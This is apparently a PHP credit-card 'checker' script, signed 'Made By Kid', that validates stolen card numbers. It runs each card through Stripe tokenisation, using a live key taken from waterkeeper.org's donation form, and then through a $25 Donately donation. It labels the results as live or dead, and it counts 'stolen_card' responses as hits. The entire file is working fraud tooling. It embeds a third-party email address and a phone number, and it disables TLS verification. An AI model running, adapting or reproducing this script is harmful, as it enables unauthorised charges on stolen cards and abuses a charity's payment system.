<?php
/* Made By Kid */
error_reporting(0);

/* Variables */
extract($_GET);
$explode = explode("|", $card);
$cc = $explode[0];
$mm = $explode[1];
$yyyy = $explode[2];
$cvv = $explode[3];
$amount = 'Charge:$'.rand(3,7).'.'.rand(01,99);
$amount2 = 'Not Charged';
$chars = str_shuffle('abcdefghijklmnqrstuvwxyz');
$username = substr($chars, 0, 10);
$email = $username.'@aldubnation.com';

/* 1st Curl Headers */
$header = array();
$header[] = 'Host: api.stripe.com';
$header[] = 'accept: application/json';
$header[] = 'content-type: application/x-www-form-urlencoded';
$header[] = 'origin: https://js.stripe.com';
$header[] = 'sec-fetch-site: same-site';
$header[] = 'sec-fetch-mode: cors';
$header[] = 'sec-fetch-dest: empty';
$header[] = 'referer: https://js.stripe.com/v3/controller-d455da66ae7d0fcd3302b81255612e3a.html';

/* 1st Postfield */
$post = 'card[name]=Ariandne+Galbei&card[address_line1]=3528+taylor+st&card[address_line2]=3528+taylor+st&card[address_city]=utica&card[address_state]=NV&card[address_zip]=57111&card[address_country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&guid=1a0e351a-b3ae-4acc-969b-d5ba63e203461034f1&muid=4907e73c-07ce-4d21-8d55-b1678c2dd4415a1927&sid=402c315e-5e61-4ccd-9d26-d0426d3db345e0a5a5&payment_user_agent=stripe.js%2F8a2e5f97%3B+stripe-js-v3%2F8a2e5f97&time_on_page=1427155&referrer=https%3A%2F%2Fwaterkeeper.org%2Fdonate%2F&key=pk_live_T0LDuJcnjhAGRKVhfmLnjclt&pasted_fields=number';

/* 1st Curl */
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);

/* 1st Response */
$result1 = curl_exec($ch);
$json = json_decode($result1, true);
curl_close($ch);
$id = $json["id"];
$err1 = '[Message] '.$json["error"]["message"].' [D-Code] '.$json["error"]["decline_code"];

if (isset($id)) {

/* 2nd Curl Headers */
$header = array();
$header[] = 'Host: api.donately.com';
$header[] = 'accept: application/json, text/javascript;';
$header[] = 'donately-version: 2019-03-15';
$header[] = 'content-type: application/json; charset=UTF-8';
$header[] = 'origin: https://waterkeeper.org';
$header[] = 'sec-fetch-site: cross-site';
$header[] = 'sec-fetch-mode: cors';
$header[] = 'sec-fetch-dest: empty';
$header[] = 'referer: https://waterkeeper.org/donate/';

/* 2nd Postfield */
$post= '{"campaign_id":null,"fundraiser_id":null,"dont_send_receipt_email":false,"first_name":"Ariandne","last_name":"Galbei","email":"techyhyper@gmail.com","amount_in_cents":2500,"currency":"USD","recurring":false,"recurring_frequency":"false","recurring_start_day":"","recurring_stop_day":"","phone_number":"(787)-018-6382","street_address":"3528 taylor st","street_address_2":"3528 taylor st","city":"utica","state":"NV","zip_code":"57111","country":"US","comment":"","on_behalf_of":"","anonymous":false,"dump":null,"meta_data":"{\"program_designation\":\"General\",\"in_honor_of_choice\":\"false\"}","dtd_data":null,"payment_auth":"{\"stripe_token\":\"'.$id.'\"}","origin":"https%3A%2F%2Fwaterkeeper.org%2Fdonate%2F","form":"{\"version\":\"4.0.162\",\"id\":null}"}';

/* 2nd Curl */
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,
'https://api.donately.com/v2/donations.json?account_id=act_aa21b4d3e920&donation_type=cc&x1=fda51b58c3b7a692ba998b49abe82e6f');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);

/* 2nd Response */
$result2 = curl_exec($ch);
$json = json_decode($result2, true);
curl_close($ch);
$err2 = '[Message] '.$json["message"].' [D-Code] '.$json["error"]["decline_code"];
$message = $json["message"];

if (strpos($result1, '"cvc_check": "pass"')) {
echo '<span class="badge badge-success"> #CVV </span> <span class="badge badge-success">'.$card.'</span> <span class="badge badge-success"> '.$amount.' </span> <span class="badge badge-success"> CVV Match </span> <span class="badge badge-success"> <b>Kaito</b> </span> <br>';
}
elseif (strpos($result2, "Your card has insufficient funds.")) {
echo '<span class="badge badge-success"> #CVV </span> <span class="badge badge-success"> '.$card.' </span> <span class="badge badge-success"> '.$amount.' </span> <span class="badge badge-success"> '.$err2.' </span> <span class="badge badge-success"> <b>Kaito</b> </span> <br>';
}
elseif (strpos($result2, "Your card's security code is incorrect.")) {
echo '<span class="badge badge-success"> #CCN </span> <span class="badge badge-success"> '.$card.' </span> <span class="badge badge-light"> '.$amount.' </span> <span class="badge badge-success"> '.$err2.' </span> <span class="badge badge-light"> <b>Kaito</b> </span> <br>';
}
elseif (strpos($result2, 'stolen_card')) {
echo '<span class="badge badge-success"> #CCN </span> <span class="badge badge-success"> '.$card.' </span> <span class="badge badge-light"> '.$amount.' </span> <span class="badge badge-success"> '.$err2.'</span> <span class="badge badge-light"> <b>Kaito</b> </span> <br>';
}
elseif (strpos($result2, 'pickup_card')) {
echo '<span class="badge badge-success"> #CCN </span> <span class="badge badge-success"> '.$card.' </span> <span class="badge badge-light"> '.$amount.' </span> <span class="badge badge-success"> '.$err2.'</span> <span class="badge badge-light"> <b>Kaito</b> </span> <br>';
}
elseif (strpos($result2, '"Your card was declined."')) {
echo '<span class="badge badge-dark"> #DEAD </span> <span class="badge badge-dark">'.$card.'</span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-dark"> Your card was declined. </span> <span class="badge badge-warning"> <b>Kaito</b> </span> <br>';
}
elseif (strpos($result1, '"cvc_check": "unchecked"')) {
echo '<span class="badge badge-dark"> #DEAD </span> <span class="badge badge-dark">'.$card.'</span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-dark"> CVC Unchecked </span> <span class="badge badge-warning"> <b>Kaito</b> </span> <br>';
}
elseif (strpos($result1, '"cvc_check": "unavailable"')) {
echo '<span class="badge badge-dark"> #DEAD </span> <span class="badge badge-dark">'.$card.'</span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-dark"> CVC Unavailable </span> <span class="badge badge-warning"> <b>Kaito</b> </span> <br>';
}
else {
echo '<span class="badge badge-dark"> #DEAD </span> <span class="badge badge-dark"> '.$card.' </span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-dark"> '.$err2.' </span> <span class="badge badge-warning"> <b>Kaito</b> </span> <br>';
}
}
else {
echo '<span class="badge badge-dark"> #DEAD </span> <span class="badge badge-dark"> '.$card.' </span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-dark"> '.$err1.' </span> <span class="badge badge-warning"> <b>Kaito</b> </span> <br>';
}
/* Made by Kid */
?>
